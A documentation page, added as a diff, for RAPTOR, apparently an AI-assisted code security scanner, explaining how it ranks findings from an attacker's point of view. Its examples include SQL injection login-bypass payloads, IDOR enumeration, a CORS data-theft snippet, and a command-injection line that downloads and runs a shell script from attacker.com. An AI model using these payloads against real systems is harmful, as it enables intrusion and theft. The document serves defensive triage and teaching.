@@ -1,0 +1,546 @@
+---
+title: Adversarial Thinking
+description: How RAPTOR prioritizes security findings using attacker-centric analysis and impact-based decision making
+---
+
+RAPTOR uses adversarial thinking to prioritize security findings based on real-world exploitation likelihood and impact. This approach helps security teams focus on what matters most to attackers.
+
+## The Prioritization Formula
+
+RAPTOR prioritizes findings using:
+
+```
+Priority = (Impact × Exploitability) / Detection Time
+```
+
+**Impact:** What can an attacker achieve?
+- Critical: RCE, database access, full system compromise
+- High: Data breach, privilege escalation, account takeover
+- Medium: Information disclosure, DoS
+- Low: Minor leaks, configuration issues
+
+**Exploitability:** How easy to exploit?
+- High: Direct exploitation, no prerequisites, public exploits
+- Medium: Requires authentication, bypass needed, complex payload
+- Low: Multiple prerequisites, low reliability, theoretical only
+
+**Detection Time:** How fast can defenders detect?
+- Instant: Secrets in code (no exploitation needed)
+- Fast: Input validation issues (obvious payloads)
+- Slow: Logic flaws, authorization issues (subtle)
+
+## Adversarial Analysis Framework
+
+When Python returns findings, RAPTOR analyzes them with an adversarial lens.
+
+**Source:** `tiers/analysis-guidance.md:1`
+
+**Auto-loads:** After Python scan completes (keywords: "findings", "results", "vulnerabilities")
+
+### Priority Order (Result Analysis)
+
+#### 1. Secrets/Credentials (If Found)
+
+**Why review first:**
+- Instant compromise (no exploitation needed)
+- Maximum impact (cloud infrastructure, full account access)
+- Examples: AWS keys, GitHub tokens, database passwords, API keys
+
+**Attacker perspective:**
+```
+1. Find exposed secret in code/logs
+2. Use secret to authenticate
+3. Game over - full access
+```
+
+**Real-world example:**
+```python
+# Found in config.py
+AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
+AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+
+# Attacker uses:
+aws s3 ls --profile stolen  # Lists all S3 buckets
+aws ec2 describe-instances  # Full infrastructure visibility
+```
+
+**Present to user:** "Found [N] secrets - instant compromise risk - REVIEW FIRST"
+
+#### 2. Input Validation Issues (If Found)
+
+**Why review second:**
+- Most common and highly exploitable
+- Direct impact (SQLi = database access, XSS = account takeover, command injection = RCE)
+- Examples: SQL injection, XSS, command injection, deserialization
+
+**Attacker perspective:**
+```
+1. Find input that reaches dangerous function (SQL query, exec, eval)
+2. Inject malicious payload
+3. Immediate impact (data theft, code execution, session hijack)
+```
+
+**Real-world example:**
+
+```python
+# SQL Injection in login.py:42
+query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
+db.execute(query)
+
+# Attacker payload:
+username: admin' OR '1'='1' --
+password: anything
+
+# Resulting query:
+# SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='anything'
+# Returns admin user, authentication bypassed
+```
+
+**Present to user:** "Found [N] input validation issues - high exploitability - REVIEW SECOND"
+
+#### 3. Authentication/Authorization (If Found)
+
+**Why review third:**
+- Critical access control failures
+- Enables unauthorized access
+- Examples: Missing auth checks, broken access control, IDOR, JWT issues
+
+**Attacker perspective:**
+```
+1. Identify endpoint with missing auth check
+2. Access directly without authentication
+3. OR: Manipulate parameter to access other user's data (IDOR)
+```
+
+**Real-world example:**
+
+```python
+# Missing auth check in api/admin.py:15
+@app.route('/admin/users')
+def list_users():
+    # No authentication check!
+    return jsonify(User.query.all())
+
+# Attacker accesses:
+curl https://target.com/admin/users
+# Returns all user data without authentication
+```
+
+**IDOR example:**
+
+```python
+# Broken access control in api/documents.py:28
+@app.route('/documents/<doc_id>')
+@login_required
+def get_document(doc_id):
+    doc = Document.query.get(doc_id)
+    # No check if current_user owns doc!
+    return jsonify(doc)
+
+# Attacker iterates:
+GET /documents/1  # Their document
+GET /documents/2  # Someone else's document (but works!)
+GET /documents/3  # Another user's document
+```
+
+**Present to user:** "Found [N] auth issues - unauthorized access - REVIEW THIRD"
+
+#### 4. Cryptography Issues (If Found)
+
+**Why review fourth:**
+- Data protection failures
+- Examples: Weak algorithms (MD5, SHA1, DES), hardcoded keys, weak random
+
+**Attacker perspective:**
+```
+1. Identify weak crypto (MD5, SHA1, DES)
+2. Capture encrypted data
+3. Crack with known attacks (rainbow tables, collision attacks)
+4. Access plaintext data
+```
+
+**Real-world example:**
+
+```python
+# Weak hash in auth.py:67
+import hashlib
+
+def hash_password(password):
+    return hashlib.md5(password.encode()).hexdigest()
+
+# Attacker approach:
+# 1. Obtain password hash from database (via SQLi or breach)
+# 2. Use rainbow table lookup
+# 3. Instant password recovery for weak passwords
+```
+
+**Hardcoded key example:**
+
+```python
+# Hardcoded encryption key in config.py:12
+ENCRYPTION_KEY = "super_secret_key_123"
+
+# Attacker:
+# 1. Find key in source code (GitHub, decompiled binary)
+# 2. Decrypt all data encrypted with this key
+# 3. Full data breach
+```
+
+**Present to user:** "Found [N] crypto issues - data protection - REVIEW FOURTH"
+
+#### 5. Configuration Issues (If Found)
+
+**Why review last:**
+- Security baseline problems
+- Examples: Debug mode in production, insecure CORS, missing headers
+
+**Attacker perspective:**
+```
+1. Identify debug mode enabled
+2. Access debug endpoints
+3. Extract stack traces, environment variables, internal state
+```
+
+**Real-world example:**
+
+```python
+# Debug mode in production (app.py:5)
+app = Flask(__name__)
+app.config['DEBUG'] = True  # NEVER in production!
+
+# Attacker accesses error page:
+# - Full stack trace with file paths
+# - Environment variables (may contain secrets)
+# - Interactive debugger (code execution!)
+```
+
+**CORS misconfiguration:**
+
+```python
+# Insecure CORS in api.py:10
+@app.after_request
+def after_request(response):
+    response.headers['Access-Control-Allow-Origin'] = '*'
+    # Allows any website to make requests with user's credentials
+    return response
+
+# Attacker creates malicious website:
+# <script>
+#   fetch('https://target.com/api/user/data', {credentials: 'include'})
+#     .then(data => sendToAttacker(data))
+# </script>
+# Victim visits attacker's site → data stolen
+```
+
+**Present to user:** "Found [N] config issues - security baseline - REVIEW LAST"
+
+## Decision Template
+
+After analyzing and prioritizing findings:
+
+```
+Results: [N] findings from Python
+
+[Summarize with adversarial priority ordering]
+
+What next?
+1. Deep - Analyze top findings in detail
+2. Fix - Apply patches / review exploits Python generated
+3. Generate report - Summarize and export
+4. Retry - Run Python again with different parameters
+5. Done - Finish
+
+Your choice? [1-5]
+```
+
+**Execute user choice, then repeat template.**
+
+## Security Researcher Persona
+
+For deep analysis, load the security researcher persona:
+
+**Location:** `tiers/personas/security_researcher.md:1`
+
+**Usage:** `"Use security researcher persona to analyze finding #X"`
+
+### 4-Step Analysis Framework
+
+#### 1. Source Control Analysis
+
+**Question:** Who controls this data source?
+
+**Attacker Controlled ✅ (Exploitable):**
+- HTTP request parameters (GET/POST)
+- User input (form fields, file uploads)
+- URL parameters, headers, cookies
+- External API responses (untrusted sources)
+
+**Requires Access First 🔶 (Conditional):**
+- Config files (need server access)
+- Environment variables (need shell access)
+- Database content (need SQL access)
+
+**Internal Only ❌ (False Positive):**
+- Hardcoded constants
+- Internal computed variables
+- Framework-generated values
+- Trusted internal services
+
+#### 2. Sanitizer Effectiveness Analysis
+
+**For each sanitizer in dataflow path:**
+
+**What does it do?** (Code-level understanding)
+- Examine actual implementation
+- Identify sanitization approach (trim, replace, escape, encode, validate)
+
+**Is it appropriate?** (Vulnerability type matching)
+- SQL injection needs: Parameterized queries OR proper SQL escaping
+- XSS needs: HTML entity encoding (context-aware: HTML/JS/CSS/URL)
+- Command injection needs: Input validation OR safe APIs (no shell)
+- Path traversal needs: Canonicalization + whitelist validation
+
+**Can it be bypassed?** (Common bypass techniques)
+- Incomplete sanitization (only filters some characters)
+- Encoding bypasses (URL encoding, double encoding, Unicode normalization)
+- Case sensitivity issues (blacklist checks uppercase only)
+- Logic errors (sanitizes variable A, uses variable B)
+- Order of operations (validate → sanitize → use UNSANITIZED)
+
+**Applied to ALL paths?** (Coverage analysis)
+- Conditional branches (if/else gaps)
+- Error handling paths (exception bypass)
+- Alternative code paths (multiple routes to sink)
+
+#### 3. Reachability Analysis
+
+**Can attacker actually trigger this code path?**
+
+**Authentication checks:**
+- Public endpoint (no auth) → Highly reachable ✅
+- Authenticated users → Medium reachability 🔶
+- Admin only → Low reachability ⚠️
+
+**Authorization checks:**
+- Missing authorization → Exploitable ✅
+- IDOR vulnerability → Exploitable via parameter manipulation ✅
+- Proper access control → Requires valid credentials 🔶
+
+**Prerequisites:**
+- No prerequisites → Directly exploitable ✅
+- Requires account → Medium barrier 🔶
+- Requires specific state → High complexity ⚠️
+
+**Production deployment:**
+- Production code path → Exploitable ✅
+- Test/debug code only → Lower priority 🔶
+- Dead code (never called) → False positive ❌
+
+#### 4. Impact Assessment
+
+**Database Access (SQL Injection):**
+- Read sensitive data (PII, credentials, secrets) → High impact
+- Modify data (privilege escalation, fraud) → Critical impact
+- Delete data (DoS, data loss) → High impact
+- Stack queries (DB → OS command execution) → Critical impact
+
+**Code Execution (RCE):**
+- Shell access → Critical (game over)
+- Read server files (secrets, config) → High impact
+- Lateral movement (internal network) → Critical impact
+- Persistence (backdoor, rootkit) → Critical impact
+
+**Client-Side (XSS):**
+- Stored XSS → High impact (persistent)
+- Reflected XSS → Medium impact (requires social engineering)
+- Session hijacking (steal cookies) → High impact
+- Malware distribution (watering hole) → Critical impact
+
+## Real-World Examples
+
+### Example 1: Command Injection (Critical)
+
+**Finding:** Command injection in `api/system.py:42`
+
+```python
+import subprocess
+
+@app.route('/api/ping')
+def ping_host():
+    host = request.args.get('host')
+    # Vulnerable: Direct shell execution with user input
+    result = subprocess.check_output(f'ping -c 1 {host}', shell=True)
+    return result
+```
+
+**Adversarial analysis:**
+
+1. **Source Control:** HTTP GET parameter → Attacker controlled ✅
+2. **Sanitizer:** None → Bypassable ✅
+3. **Reachability:** Public endpoint → Highly reachable ✅
+4. **Impact:** RCE → Critical ✅
+
+**Attack scenario:**
+```bash
+# Attacker payload:
+curl "https://target.com/api/ping?host=8.8.8.8;whoami"
+
+# Resulting command:
+ping -c 1 8.8.8.8;whoami
+# Executes: ping 8.8.8.8, then whoami
+
+# Full compromise:
+curl "https://target.com/api/ping?host=8.8.8.8;wget attacker.com/shell.sh -O /tmp/shell.sh;bash /tmp/shell.sh"
+# Downloads and executes reverse shell
+```
+
+**Verdict:** EXPLOITABLE (High confidence)
+
+**Priority:** 1 (Review first after secrets)
+
+### Example 2: SQL Injection with Sanitizer Bypass
+
+**Finding:** SQL injection in `auth/login.py:28`
+
+```python
+def login(username, password):
+    # Attempted sanitization (incomplete)
+    username = username.replace("'", "")
+
+    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
+    user = db.execute(query).fetchone()
+    return user
+```
+
+**Adversarial analysis:**
+
+1. **Source Control:** POST parameters → Attacker controlled ✅
+2. **Sanitizer:** Removes single quotes BUT password is unsanitized → Bypassable ✅
+3. **Reachability:** Public login endpoint → Highly reachable ✅
+4. **Impact:** Database access, authentication bypass → Critical ✅
+
+**Attack scenario:**
+```bash
+# Attacker payload:
+username: admin
+password: anything' OR '1'='1' --
+
+# Resulting query:
+SELECT * FROM users WHERE username='admin' AND password='anything' OR '1'='1' --'
+# OR clause makes entire WHERE true, -- comments out rest
+# Returns admin user, authentication bypassed
+```
+
+**Verdict:** EXPLOITABLE (High confidence)
+
+### Example 3: False Positive (Sanitizer Effective)
+
+**Finding:** Potential XSS in `views/profile.py:15`
+
+```python
+from markupsafe import escape
+
+@app.route('/profile/<username>')
+def profile(username):
+    # Proper sanitization
+    safe_username = escape(username)
+    return f'<h1>Profile: {safe_username}</h1>'
+```
+
+**Adversarial analysis:**
+
+1. **Source Control:** URL parameter → Attacker controlled ✅
+2. **Sanitizer:** `escape()` properly HTML-encodes all dangerous characters → Effective ❌
+3. **Reachability:** Public endpoint → Highly reachable ✅
+4. **Impact:** XSS blocked by sanitizer → None ❌
+
+**Test:**
+```bash
+# Attacker payload:
+<script>alert(1)</script>
+
+# After escape():
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+# Rendered in browser:
+<h1>Profile: &lt;script&gt;alert(1)&lt;/script&gt;</h1>
+# Displays as text, does not execute
+```
+
+**Verdict:** FALSE POSITIVE (Effective sanitizer in place)
+
+## The 5-Option Decision Template
+
+After every scan, RAPTOR presents structured options:
+
+```
+Results: [N] findings from Python
+
+Priority breakdown:
+- [N] Secrets (instant compromise)
+- [N] Input validation issues (high exploitability)
+- [N] Auth/authz issues (unauthorized access)
+- [N] Crypto issues (data protection)
+- [N] Config issues (baseline)
+
+What next?
+1. Deep - Analyze top findings in detail
+2. Fix - Apply patches / review exploits Python generated
+3. Generate report - Summarize and export
+4. Retry - Run Python again with different parameters
+5. Done - Finish
+
+Your choice? [1-5]
+```
+
+**Option 1: Deep Analysis**
+- Load security researcher persona
+- Apply 4-step framework to top findings
+- Generate PoCs for confirmed vulnerabilities
+- Assess exploitability with binary analysis (if applicable)
+
+**Option 2: Fix**
+- Review Python-generated patches
+- Apply patches with user confirmation
+- OR: Load exploit developer persona for custom exploits
+- OR: Load patch engineer persona for custom patches
+
+**Option 3: Generate Report**
+- Compile findings with adversarial prioritization
+- Include PoCs and patches
+- Export to JSON/SARIF/Markdown
+- Include CVSS scores and risk ratings
+
+**Option 4: Retry**
+- Adjust scan parameters (more policy groups, deeper analysis)
+- Enable CodeQL dataflow validation
+- Run fuzzing for binary targets
+- Increase max findings processed
+
+**Option 5: Done**
+- Save session state
+- Write final report to `out/`
+- Exit
+
+## Important Notes
+
+**This is for presenting results, not changing Python's execution:**
+- Python scans everything in parallel (no priority order in execution)
+- Adversarial thinking helps user understand what matters most
+- User can always override this prioritization
+
+**Example:**
+```
+User: "Show me config issues first, I don't care about secrets"
+Claude: ✓ Showing config issues first (your priority)
+```
+
+**User always has final say on what to review.**
+
+<Warning>
+The adversarial thinking framework prioritizes findings from an attacker's perspective. This does not mean other findings are unimportant - it means these are what attackers will exploit first.
+</Warning>
+
+<Tip>
+Use the security researcher persona for deep analysis of specific findings: "Use security researcher persona to analyze finding #42"
+</Tip>
